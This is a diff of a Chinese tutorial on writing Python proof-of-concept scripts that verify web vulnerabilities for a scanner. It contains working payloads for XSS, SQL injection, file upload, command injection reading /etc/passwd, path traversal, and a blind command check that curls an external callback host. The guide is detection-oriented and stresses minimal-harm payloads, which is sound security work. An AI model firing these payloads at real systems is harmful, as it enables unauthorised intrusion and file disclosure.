@@ -78,345 +78,559 @@ POC，POC \(Proof of Concept\) 验证性测试，译为为观点提供证据，�
 
 文档以python为例：
 
-### 1，简单发包
+在脚本编写的过程中，我们需要注意很多问题，才能保证脚本在运行过程中减少误报和漏报的几率。所以在编写脚本时要注意以下事项。
 
-因为要发送HTTP请求，所以需要导入requests库，可以通过引用相关方法去发送请求，如GET，POST，PUT等
+#### 在漏洞选取方面，有如下注意事项：
 
-简单漏洞的burp抓包内容如下：
+不是所有的漏洞都可以编写脚本，快速挑选正确的漏洞可以节省时间。首先遵循的原则是：除了乌云漏洞，所有的漏洞都要复现后再编写。否则可能跟实际情况不符，脚本无法正确验证漏洞。
 
-体现到代码中，就是：
+漏洞的选择顺序：
 
-```python
-Req = requests.get()
-Req = requests.post()
+1. 优先选取最新的CVE CNVD等带编号的漏洞，cve漏洞部分详情链接里有利用过程\(来源是github，大概率存在利用过程\)，从而可以复现漏洞。同时，如果通过代码审计挖掘出0day漏洞，优选写0day漏洞。
+2. 其次是最新爆出的不带编号的漏洞。如freebuf 先知 安全客等网站发表的代码审计文章中爆出的漏洞。
+3. 然后是非最新的带编号的漏洞或者之前公布的漏洞。如各大安全网站之前发表的漏洞文章或github上找到的漏洞。
+4. 最后，如果当周以上漏洞都没有，或者都已经写过，可以挑选乌云漏洞的脚本。这些漏洞被人编写过脚本，大概率已经验证过了，可以减少误报漏报的概率（这些脚本无法验证，质量不高，但是可以提高数量，且其他厂商基于插件的漏扫大多包括乌云漏洞）。
+
+同时，以下漏洞可以不必考虑编写脚本：
+
+1. 需要其他环境配合的漏洞，暂不考虑（如需要再搭建另外的环境才能验证的漏洞）。
+2. 不能实时真正验证的漏洞不需要考虑，如CSRF漏洞等。
+
+#### 漏洞须知
+
+脚本的编写需要遵循通用性、确定性、最小伤害性。通用性即要多个平台都可以验证；确定性即要确定能够验证该漏洞；最小伤害性是要对测试目标造成的影响要最小。以下根据漏洞分类来说明：
+
+| 漏洞类型 | 通用性 | 确定性 | 最小伤害 |
+| :--- | :--- | :--- | :--- |
+| SQL注入 | 要确定目标使用哪种语言，如果不确定使用哪种SQL语言，则使用多种语言都存在的函数来进行验证。而一般的CMS都会给定配套的SQL语言 | 要能验证真的执行了SQL语句，不能仅通过加单引号等字符报错来判断存在SQL注入，可以使用函数进行验证，如MD5\(\) ascii\(\) pi\(\) | payload不要真的去查用户名密码，一方面响应不唯一没有能够检测的特征，另一方面可能会违反法律，所以只要使用md5\(\) ascii\(\)这些函数检测即可 |
+| XSS |  | XSS漏洞是很容易误报的漏洞。所以在验证XSS漏洞的时候，payload不能太过简单，要包含所有符号，如 ”/&gt;&lt;svg/onload=alert\(‘xss’\)/&gt;，如果是能复现的漏洞，查看源代码中是否有独一无二的代码，使用and进行多次验证 | 验证XSS漏洞只需要检测弹框代码，alert\(1\)或document.write\(\)都可以，不必真的引入恶意代码 |
+| 命令执行 | 不同的系统有不同的命令，所以在验证的时候，除非已经确定目标所在的系统，否则payload要选取不同系统都存在的命令。比如netstat –ano，并且要验证不同情况下的返回结果，严禁仅验证ifconfig 或whoami这种命令 | 命令执行漏洞要验证命令的执行结果，不能仅通过200或者500的返回值判断漏洞是否存在，且echo 1234这种很可能造成误报的命令尽量不要使用 | 编写脚本时，只需验证一些无害的命令，类似于删除文件，或者留后门的命令不要使用 |
+| 代码执行 | 在编写脚本时，要考虑多种情况，如php版本问题，php7以后禁掉了assert函数，所以在选取payload时最好不要使用assert函数 | 验证时，不能仅通过响应码判断漏洞是否存在，要验证代码的执行结果。同时，如果使用echo验证，应该使用echo md5\(\)，而不是echo 1234的payload。Jsp和asp代码执行时，可使用数学计算+输出随机字符串的方式 | 仅需验证普通的代码执行结果即可，不能使用eval等函数添加后门或shell文件。但是当echo等函数无法验证时，php中可使用phpinfo\(\)来验证 |
+| 信息泄露 |  | 当存在泄露文件时，不能通过文件的响应值来判断是否存在信息泄露，应该验证确切的响应内容，并且，在判断响应内容时，不能仅判断username这种其他网站也可能存在的内容，应该验证独一无二的内容或多次and验证 |  |
+| 文件上传 | 上传的文件要在多个系统下都能正常执行，在上传文件时，文件名最好不要有大小写混合。防止出现系统处理文件名进行大小写统一转换的情况 | 在上传文件时，要上传对应语言的文件，不能只上传本来就不限制的文件（如txt，jpg），同时，在上传文件后，要再次确认上传文件的响应内容是否正确。一般情况下，php可上传echo md5\(\)的文件内容，jsp和asp可上传&lt;%=23333\*9999%&gt;这种数学运算的内容 | 不能上传木马文件到服务器中，当上传php文件时，最好加上删除自身文件的代码，这样在访问时即可消除痕迹，防止被其他人利用 |
+| 目录遍历 | payload首先选取组件自带的文件，如joomla的configuration.php文件，wordpress的wp-config.php文件，并通过响应内容中的独一无二的变量进行判断。当无法读取自身文件时，可通过读取系统文件判断，但要注意同一脚本中要同时检测window下和linux下的系统文件 |  | 有一些情况下，在读取文件后，会删除该文件。**所以复现漏洞时要注意该情况，如果存在删除操作，那么此漏洞不能编写成脚本** |
+
+#### 脚本分类
+
+编写脚本主要是编写类似于payload脚本下的单个脚本。 
+
+#### 开始写吧
+
+首先，在编写脚本的时候，尤其是编写web应用漏洞时，需要用到的库就是[`requests`](https://docs.python-requests.org/zh_CN/latest/)，用它来收包与发包，最为方便快捷
+
+### **我不会python怎么办？**（当然是学啊）
+
+如果会使用burpsuite，那么编写脚本的难度就会降低许多，以单次发包为例，下面是示例： 图中有用的信息有什么呢？
+
+1. 请求：请求方法，请求路径，请求行
+2. 响应：响应头，响应行，响应体，响应所用时间
+
+### XSS与字段意义
+
+![](../../.gitbook/assets/lizi-xss.jpg)
+
+从图中可以看出，这个漏洞是XSS，且是使用GET方法发送了一个包，这个包**最简化**后，我放在下面：
+
+```bash
+GET /level1.php?name=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
+Host: 123.123.123.123
 ```
 
-也可以这样：
-
-```python
-Req = requests.request("POST")
-```
-
-首先，可以将请求路径部分赋值给 path
-
-```python
-Path = "/confit.php"
-```
-
-之后便是请求行的部分了，在burp中，会发现如果请求的时候没有HOST，那么访问就会失败，不过在python中，不需要刻意定义HOST。为了方便起见，可以先在burp中将请求行简化到最简单，然后放到下面的内容中：
-
-```python
-headers = {
-    "user-agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
-}
-```
-
-那么此时，若根据图中的内容编写一个简单的发包示例，应该怎么编写呢？
-
-![&#x8FD9;&#x662F;&#x539F;&#x6765;&#x7684;&#x5305;](../../.gitbook/assets/image%20%281078%29.png)
-
-**注意**：发包时，内容要最简化
-
-![&#x7B80;&#x5316;&#x540E;](../../.gitbook/assets/image%20%281082%29.png)
-
-所以，此时的发包脚本可以这么编写：
+此时，python代码中可以这样表示：
 
 ```python
 import requests
+target = ""
+url = target + "/level1.php?name=%3Cscript%3Ealert(1)%3C/script%3E"
+req = requests.get(url，timeout=10)
+# 也可以这样：
+method = "GET"
+req = requests.request(method, url，timeout=10)
+```
 
+**burp图中有HOST，那怎么代码中没有呢？**
+
+原因：python会自带host部分，所以不需要再次定义HOST，此时headers中的user-agent为`python/requests-1.7`
+
+当然了，有的页面如果不是正常浏览器的样子，是拒绝访问的，所以，可以设置headers中的UA部分为：
+
+```text
 headers = {
-    "user-agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
+    "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
 }
-path = "/Less-2/?id=-1%20union%20select%2011111,md5(1),55555--+"
-target = "http://127.0.0.1:8008"
-url = target + path
-req = requests.get(url, headers=headers, timeout=10)
-
-print req.status_code
-print req.headers
-print req.content  (or print req.text)
 ```
 
- 为什么脚本中没有HOST字段呢？？？？  
-因为在python中，可以自带HOST，而不需要手动指定HOST，更方便了我们的使用
+那么返回包呢，我能从哪里知道有XSS存在？
 
-timeout是啥？  
-在访问一些网站的时候，总会有延迟，所以会设置超时，一般设置几秒自己开心就好  
-如果是国外的网站，可能延迟会比较高，这个时候可以设置的高一些，比如30左右
-
- 当运行代码后，你收到的可能是这样的：
-
-```javascript
-200
-{"Date": "Thu, 22 Apr 2021 03:16:33 GMT","Server": "Apache/2.4.7 (Ubuntu)","X-Powered-By": "PHP/5.5.9-1ubuntu4.13","Vary": "Accept-Encoding","Content-Length": "750","Content-Type": "text/html"}
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-<title>Less-2 **Error Based- Intiger**</title>
-</head>
-<body bgcolor="#000000">
-<div style=" margin-top:60px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
-<font size="3" color="#FFFF00">
-<font size='5' color= '#99FF00'>Your Login name:c4ca4238a0b923820dcc509a6f75849b<br>Your Password:55555</font>
-</font> </div></br></br></br><center>
-<img src="../images/Less-2.jpg" /></center>
-</body>
-</html>
-```
-
-而在burpsuite的显示中，是这个样子的：
-
-```yaml
+```text
 HTTP/1.1 200 OK
-Date: Thu, 22 Apr 2021 03:16:33 GMT
-Server: Apache/2.4.7 (Ubuntu)
-X-Powered-By: PHP/5.5.9-1ubuntu4.13
+Date: Fri, 28 May 2021 07:38:15 GMT
+Server: Apache
+Upgrade: h2
+Connection: Upgrade, close
 Vary: Accept-Encoding
-Content-Length: 750
 Content-Type: text/html
-
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
+Content-Length: 497
+​
+<!DOCTYPE html><!--STATUS OK--><html>
 <head>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-<title>Less-2 **Error Based- Intiger**</title>
+<meta http-equiv="content-type" content="text/html;charset=utf-8">
+<script>
+window.alert = function()  
+{     
+confirm("完成的不错！");
+ window.location.href="level2.php?keyword=test"; 
+}
+</script>
+<title>欢迎来到level1</title>
 </head>
-
-<body bgcolor="#000000">
-
-<div style=" margin-top:60px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
-<font size="3" color="#FFFF00">
-
-<font size='5' color= '#99FF00'>Your Login name:c4ca4238a0b923820dcc509a6f75849b<br>Your Password:55555</font>
-
-</font> </div></br></br></br><center>
-<img src="../images/Less-2.jpg" /></center>
-</body>
+<body>
+<h1 align=center>欢迎来到level1</h1>
+<h2 align=center>欢迎用户<script>alert(1)</script></h2><center><img src=level1.png></center>
+<h3 align=center>payload的长度:25</h3></body>
 </html>
 ```
 
-上述请求中，只是根据一个SQL注入，简单查询了1的MD5值，此时，返回包中的较为明显的特征值有：
+因为payload是 `<script>alert(1)</script>`，那么如果只检测**1**行不行？
 
 ```text
-HTTP/1.1 200 OK    # 返回值为200
-c4ca4238a0b923820dcc509a6f75849b    # 1的MD5值
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 ```
 
-那么此时，脚本可以使用 `try-except`组合与`if-else`组合来编写：
+在上面那段代码中，`1`这个数字出现了不止一次，如果我们访问10086网站呢？上面的1只会更多
+
+那么加上alert，应该会好很多吧？？？
+
+```text
+//alert('len2:'+chAry.length);
+//alert(1)
+```
+
+如上，在一些JS的注释中，如果只检测这些的话，很容易存在误报，只有将完整的payload都匹配上才可，这时的思路是：响应体中存在`<script>alert(1)</script>`，也就是连着标签一起检测
+
+为了脚本的准确性，其实还应该在三方面考虑脚本的写法，例如根据响应头，响应行，响应体三方面来判断，那么此时的脚本示例就是：
 
 ```python
 import requests
-
 headers = {
-    "user-agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
+    "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
 }
-path = "/Less-2/?id=-1%20union%20select%2011111,md5(1),55555--+"
-target = "http://127.0.0.1:8008"
-url = target + path
-try:
-    req = requests.get(url, headers=headers, timeout=10)
-    if req.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in req.text:
+target = ""
+url = target + "/level1.php?name=%3Cscript%3Ealert(1)%3C/script%3E"
+req = requests.get(url, headers=headers, timeout=10)
+if req.status_code == 200 and "<script>alert(1)</script>" in req.text:
+    print "漏洞存在"
+```
+
+那么再看看长亭的xray脚本，可以发现他们有在使用随机数，使用随机数的优势在于，我们可以通过这种手段，适当的减少误报
+
+使用随机数的话，又涉及到了两个其他的库:`random`和`hashlib`
+
+使用上述两个库，优化一下脚本：
+
+```python
+import requests,random
+yuju = str(random.randint(0, 999999))
+target = ""
+url = target + "/level1.php?name=%3Cscript%3Ealert({yuju})%3C/script%3E"
+req = requests.get(url)
+if req.status_code == 200 and "<script>alert({yuju})</script>" in req.text:
+    print "漏洞存在"
+```
+
+在上述脚本中，假设随机数为9999，那么脚本发送了`name=%3Cscript%3Ealert(9999)%3C/script%3E`，大意即为发送一个随机数到服务器，如果响应码为200，且响应体中也有`<script>alert(9999)</script>`存在，那么漏洞存在
+
+当浏览器在访问一些页面时，可能会遇到如图情况： 
+
+![](../../.gitbook/assets/liulanqi-error.jpg)
+
+ 其实在代码中，也会出现类似的错误，原因就是会有证书校验。那么如果想要脚本可以直接跳过这一步，又应该怎么做呢？
+
+在引用了`requests`库之后，添加两行代码，并在发包的代码中，添加`verify=False`，体现在整体中，就是这样的：
+
+```python
+import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+​
+req = requests.get(url,headers=headers, timeout=10, verify=False)
+```
+
+如果是**POST**呢？
+
+```python
+import requests,random
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+url=......
+headers={"User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50","Content-Type": "application/x-www-form-urlencoded",}
+yuju = ....
+data = "name=<script>alert({yuju})</script>"
+req = requests.post(url,headers=headers, data=data, timeout=10, verify=False)
+```
+
+如上，在POST数据的时候，通常情况下，Content-Type的值为application/x-www-form-urlencoded
+
+那么如果漏洞是**后台**的呢？此时需要引用到cookie值，也就是类似于：`Cookie: PHPSESSID=123456789`
+
+在编写脚本的时候，此时又需要引用`config.py`，在脚本中的体现就是`import config`，此时，需要在headers头中给Cookie定义为如下格式：
+
+```python
+import config
+headers={"User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50","Cookie":config.conf['cookie'],}
+```
+
+### SQL注入
+
+如果比较SQL注入漏洞，那应该会知道，并不是每台电脑的用户都是`root@localhost`，也并不是每台主机在用的数据库都是`qishicms`,`information_schema`，那么针对查询的情况，我们可以通过查询一个随机数的MD5值，去判断一个漏洞是否有注入，这样会方便许多
+
+此时的SQL语句就可以是：
+
+```text
+>  select md5(1);
+​
+>  c4ca4238a0b923820dcc509a6f75849b
+```
+
+加上随机数，那么对应到脚本上，就是这样的：
+
+```python
+import requests,random,hashlib
+yuju = str(random.randint(0, 999999))
+# mdfive,定义了yuju的MD5值，可以在SQL注入中直接使用
+mdfive = hashlib.md5(yuju).hexdigest()
+target = ""
+url = target + "/level1.php?name=1 union select MD5({yuju})"
+req = requests.get(url)
+if req.status_code == 200 and mdfive in req.text:
+    print "漏洞存在"
+```
+
+当我们复现一个延时注入的时候，通常情况下，如果使用着`sleep(2)`的语句，那么返回时间会大于等于2秒，那么如果是国外的网站呢？
+
+一般来讲，国外的网站在不挂代理的情况下，响应速度通常会比较慢，如果遇到的一个站点刚好没有注入漏洞，又响应时间较长，如果只判断响应时间，那么会在一定概率上造成误报，示例如下：
+
+```python
+if 响应时间 >= 2:
+    print "漏洞存在"
+```
+
+假设payload使得个别网站响应码为404,500时，上述的条件完全不足以证明有漏洞存在
+
+所以当脚本要检测漏洞是否存在时，示例如下：
+
+```python
+# 第一次发包代码，已省略,假设为req,sleep(2)
+if 响应时间 >= 2 and req.status_code == 200:
+    # 第二次发包代码，已省略,假设为req1,sleep(4)
+    if 响应时间 >= 4 and req1.status_code == 200:
         print "漏洞存在"
-except exception as e:
-    print str(e)
-    print "漏洞不存在"
-
 ```
 
-###  2，HTTPS
+也就是说，在检测返回包时间时，最好将响应码，响应头等信息也加入判断条件中，才能更精确的匹配到漏洞存在的网站
 
- 当我使用浏览器访问一个以HTTPS开头的网页时，浏览器总会出现一些想让我手点的地方，比如“接受风险并继续”
+那么响应时间的设定应该怎么设置呢？
 
-![](../../.gitbook/assets/image%20%281081%29.png)
+在网上，会有人告诉你，响应时间是`req.elapsed.total_seconds()`，实际上，这是获取了接口的响应时间，与发包并没与太大的关系
 
-那么在python中，我应该怎么做呢？
+所以，应该这样：示例中`sleep(2)`，最好多次验证
 
-在1中的代码基础上，只需要添加一个字段，再多写两行代码就行，代码如下：
+```python
+now = time.time()
+req = requests.get(XXXXXXXXXXXXXXXXXXXXXXXXXXXX)
+send_time = time.time() - now
+​
+if 4 >= send_time >= 2 and req.status_code == 200:
+     # 设置sleep5
+     if 7 >= send_time >= 5 and req.status_code == 200:
+        print "success"
+```
+
+当然了，若条件允许，最好将页面的其他特征值也添加进去，例如响应行信息，响应体信息，也就是页面信息
+
+### 文件上传
+
+在文件上传时，一般的数据包是这样的：
+
+![](../../.gitbook/assets/lizi-upfile.jpg)
+
+最简化后，请求部分中，最重要的只有Referer,host,user-agent,Content-Type部分，一般人会通过在脚本中都写上那些字段，并在请求体中添加`-----boundry=XXXXXXX`等来达成文件上传的目的，但这样无疑会使脚本显得不美观，类似这样：
+
+```python
+header = {
+    'Host': target_ip,
+    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
+    'Accept-Encoding': 'gzip, deflate',
+    'Content-Type': 'multipart/form-data; boundary=---------------------------5170699732428994785525662060',
+    'Connection': 'close',
+    'Referer': 'http://' + target_ip + ':' + target_port + pluckcmspath + '/admin.php?action=files',
+    'Cookie': cookie,
+    'Upgrade-Insecure-Requests': '1'
+}
+data = "-----------------------------5170699732428994785525662060\r\nContent-Disposition: form-data; name=\"filefile\"; filename=\"shell.phar\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php phpinfo();?>\n\r\n-----------------------------5170699732428994785525662060\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nUpload\r\n-----------------------------5170699732428994785525662060--\r\n"
+```
+
+而在一个较为成熟的脚本中，只需要注意其中的Content-Type,name,filename,以及文件内容即可，因为上传文件可以使用这样的代码来实现：
 
 ```python
 import requests
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-
-headers = {
-    "user-agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
-}
-path = "/Less-2/?id=-1%20union%20select%2011111,md5(1),55555--+"
-target = "http://127.0.0.1:8008"
-url = target + path
-req = requests.get(url, headers=headers, timeout=10, verify=False)
-
-print req.status_code
-print req.headers
-print req.content  (or print req.text)
-```
-
- 我只关闭认证，使用 verify=False ,那么就会得到下面的报错：
-
-```text
-InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. 
-See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
-```
-
- 所以，需要添加两行代码，大意即为禁用安全请求警告：
-
-```python
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-```
-
-此时，上面的代码就可以直接访问页面了
-
-### 3，302跳转
-
- 一般在浏览器上，最常见的是在登录框附近，当输入账号与密码后，会直接跳转至后台，而在burpsuite中，则会显示成这样：
-
-![burp&#x622A;&#x56FE;](../../.gitbook/assets/image%20%281083%29.png)
-
- 而当上面例子中的代码执行的时候，还是会自动跳转到原来应该跳转到的页面，这个时候如果想让回显为302，那么应该在请求的段中添加如下代码：
-
-```python
-req = requests.post(url, headers=headers, timeout=10, verify=False, allow_redirects=False)
-# allow_redirects=False ,设置不自动跳转
-```
-
-### 4，POST方式提交信息
-
-POST方式提交信息时，可直接定义字段，并在requests方法中赋值给data即可，如下：
-
-```python
-data = "username=admin&passwd=admin"
-req = requests.post(url, headers=headers, data=data, timeout=10, verify=False, allow_redirects=False)
-```
-
-### 5，文件上传
-
- 在burp抓包时，通常可见到文件上传的时候，都是使用POST形式上传的，而市面上的大部分脚本都是用POST方式直接将Body体放到了一个字段中，看起来比较麻烦
-
-```text
-POST /jars/upload HTTP/1.1
-Connection: close
-Accept-Encoding: gzip, deflate
-Accept: */*
-User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
-Host: IP:PORT
-Content-Type: multipart/form-data; boundary=------16403e4608fad6cc1cd8321b8b7d7f22
-Content-Length: 181
-
---16403e4608fad6cc1cd8321b8b7d7f22
-Content-Disposition: form-data; name="jarfile"; filename="1.txt"
-
-Hello Requests.
---16403e4608fad6cc1cd8321b8b7d7f22--
-```
-
- 部分脚本示例：其中，还在脚本的headers头中定义了boundray，并且在文本中添加了\r\n作为回车代替，看起来不简洁
-
-```python
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-
-headers = {
-    "user-agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
-    "Content-Type": "multipart/form-data; boundary=------16403e4608fad6cc1cd8321b8b7d7f22"
-}
-data = "--16403e4608fad6cc1cd8321b8b7d7f22\r\nContent-Disposition: form-data; name=\"jarfile\"; filename=\"1.txt\"\r\n\r\nHello Requests.\r\n--16403e4608fad6cc1cd8321b8b7d7f22--"
-path = "/jars/upload"
-target = "http://127.0.0.1:8008"
-url = target + path
-req = requests.post(url, headers=headers, data=data, timeout=10, verify=False)
-```
-
- 其实，当文件上传时，请求行中的content-type字段并不需要特别定制，后面的boundray也是。此时，脚本可以这样编写：
-
-```python
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-
-headers = {
-    "user-agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
-}
-path = "/jars/upload"
-target = "http://127.0.0.1:8008"
+url = ....
+headers = {"User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"}
 file = {
-    # 'name': ('filename', u'文件内容', u'文件自定义Content-Type'),
-    'file[]': ('shell.php', data, 'application/octet-stream'),
-    'name2': (None, 'huan'),
-    None: ('haha', 'ni'),
-    None: ('xixi', 'ya'),
+            'upload_file': ('1.php', '<?php phpinfo();?>', 'image/jpeg'),
+            'submit': (None, 'submit')
         }
-url = target + path
-req = requests.get(url, headers=headers, files=file, timeout=10, verify=False)
+req = requests.post(url, headers=headers, files=file, timeout=10, verify=False)
 ```
 
-![&#x793A;&#x4F8B;&#x4EE3;&#x7801;&#x53CA;&#x663E;&#x793A;&#x6548;&#x679C;](../../.gitbook/assets/image%20%281074%29.png)
+上述代码，可完全使得代码量变小，通过定义文件，也使代码更美观
 
-### 6，巧用随机数
+**小技巧**： 如果要上传文件的服务器上已经有了类似于shell.php的文件，那么再次上传shell.php可能会上传失败，此时也可以使用随机数的方法，将文件名设置为`随机数.php`，或者`时间戳.php`并且文件内容中可以包含随机数的MD5值与`phpinfo()`，在访问时可以减少误报
 
- 先说说随机数的应用场景：  
-一般，比较适用于一些会有干扰信息的页面。在漏洞扫描过程中，因为是根据返回值的特征来判断漏洞是否存在的，所以一些页面会使用一些干扰信息，去干扰我们的判断。
+### 命令执行
 
-![&#x5E72;&#x6270;&#x793A;&#x4F8B;](../../.gitbook/assets/image%20%281084%29.png)
+命令执行分为回显与不回显两种，对于回显的命令执行，可使用Windows与Unix通用的命令去检测，类似netstat，或者别的，也可分别发送请求，也就是发送多次请求去检测，例如：
 
-总有网站会执行XSS语句alert\(1\)，也总会有网站去查询version\(\),user\(\)，也总会有人去查询md5\(1\)，在文件上传的时候，也总会有人去上传shell.php,1.php。那么此时，随机数可能就能派上用场了
+```text
+GET /download.php?cmd=cat%20/etc/passwd HHTP/1.1
+​
+RESPONSE:
+HTTP 200 OK
+Content-Type:text/html
+// Content-Type:text/josn
+// Set-Cookie: PHPSESSID=123456789xxxxxx
+​
+// 情况一：
+<textarea>root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin...</textarea>
+// 情况二：
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin...
+<!DOCTYPE html>
+<html>......
+// 情况三：
+{"status":200,"data":"root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin..."}
+​
+// 情况四：
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+```
+
+如果忽略上述的情况，只在代码中这样检测`if "root:x:0:0" in req.text:`，也会遇到一种网站，在这种网站的注释内容中，无所不有，类似这样：
+
+![](../../.gitbook/assets/lizi-fileread.jpg)
+
+这种网站，使用[FOFA](https://classic.fofa.so)语句`body="root:x:0:0"`就可以搜索到很多了。所以此时针对三种情况，我们可以适当引用re库或json库
+
+```python
+# 情况二：
+import re
+htmls = re.search(r"^root:x:0:0", req.text)
+if htmls and req.status_code == 200:
+    return True
+# 情况一：
+if "<textarea>root:x:0:0:root" in req.text and req.status_code == 200:
+    return True
+# 情况三：
+if '{"status":200,"data":"root:x:0:0:root' in req.text and req.status_code == 200:
+    return True
+# 情况三：
+import json
+html = json.loads(req.text)
+if html['status'] == 200 and "root:x:0:0" in  html['data'] and req.status_code == 200:
+    return True
+# 情况四：(保险起见，可以引用re库，类似情况二)
+import re
+htmls = re.search(r"^root:x:0:0", req.text)
+if "<html>" not in req.text and htmls and req.status_code == 200:
+    return True
+```
+
+情况四中，代码表示： 当响应体中没有`<html>`标签，且响应体开头就是root:等内容，且响应码为200时，返回True，也就是漏洞存在（这只是示例）
+
+对于没有回显的命令执行呢？
+
+对于没有回显的命令执行，可以通过`curl http://反连平台IP`来检测：\(可使用DNSLOG代替或自己编写反连平台，后续会添加到文档中\)
+
+```python
+import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+​
+
+path = "/a.php?cmd=curl%20{ssrfUrl}"
+url = target + path
+req = requests.get(url, headers=headers, timeout=10,verify=False)
+if checkSsrf(ssrfUrl) and req.status_code = 200:
+    return Ture
+```
+
+在上述代码中，会访问`http://IP:PORT/random/随机数`，然后去Info中查询随机数的MD5值，也就是访问`http://IP:PORT/info`。如果Info中有所设置随机数的MD5信息，那么漏洞存在
+
+### 文件读取
+
+在有回显的命令执行中，我们看到了会去查看类似于passwd这样的文件，那么如果是文件读取呢？
+
+对于POST提交的数据，可以原样粘贴到请求数据中，如：
+
+```python
+data = "../../../../etc/passwd"
+```
+
+但由于requests库在引用时，如果是GET方法的请求包，则会将在路径中的`./../../`吞掉，示意图当直接将`file=../../../../etc/passwd`写在URL中，很可能访问的实际上是`file=etc/passwd`,所以此时需要进行URL编码，即将`/`编码为`%2F`，此时代码应该为：
+
+```python
+path = "a.php?file=..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd"
+```
+
+### 偶遇302
+
+在burpsuite的repeater中复现漏洞时，假如是弱口令漏洞，发现响应码是302，具体示例如下：
+
+```bash
+POST /login.php
+Host:xxx
+User-Agent:XXX
+Content-Type: application/x-www-form-urlencoded
+​
+# 情况一：普通传参，正确 
+name=admin&pass=admin
+# 情况二：分段传参，正确 
+-----------------------------215853662222818001893421125431
+Content-Disposition: form-data; name="name"
+​
+admin
+-----------------------------215853662222818001893421125431
+Content-Disposition: form-data; name="pass"
+​
+admin
+-----------------------------215853662222818001893421125431
+# 情况三：json传参
+{"name":"admin","pass":"admin"}
